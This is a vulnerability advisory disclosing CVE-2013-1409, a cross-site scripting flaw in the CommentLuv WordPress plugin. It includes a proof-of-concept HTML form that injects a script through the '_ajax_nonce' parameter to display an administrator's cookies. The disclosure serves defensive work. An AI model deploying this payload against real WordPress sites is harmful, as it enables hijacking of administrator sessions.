Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in CommentLuv WordPress plugin, which can be exploited to perform Cross-Site Scripting (XSS) attacks.


1) Cross-Site Scripting (XSS) in CommentLuv wordpress plugin: CVE-2013-1409

The vulnerability exists due to insufficient filtration of user-supplied data in "_ajax_nonce" HTTP POST parameter in the "/wp-admin/admin-ajax.php" script. A remote attacker can trick a logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

PoC (Proof-of-Concept) below uses the "alert()" JavaScript function to display administrator's cookies: 


<form action="http://[host]/wp-admin/admin-ajax.php" method="post" name="askform">
<input type="hidden" name="action" value="cl_ajax" />
<input type="hidden" name="do" value="fetch" />
<input type="hidden" name="url" value="1" />
<input type="hidden" name="_ajax_nonce" value='<script>alert(document.cookie);</script>'/>
<input type="submit" id="btn">
</form>
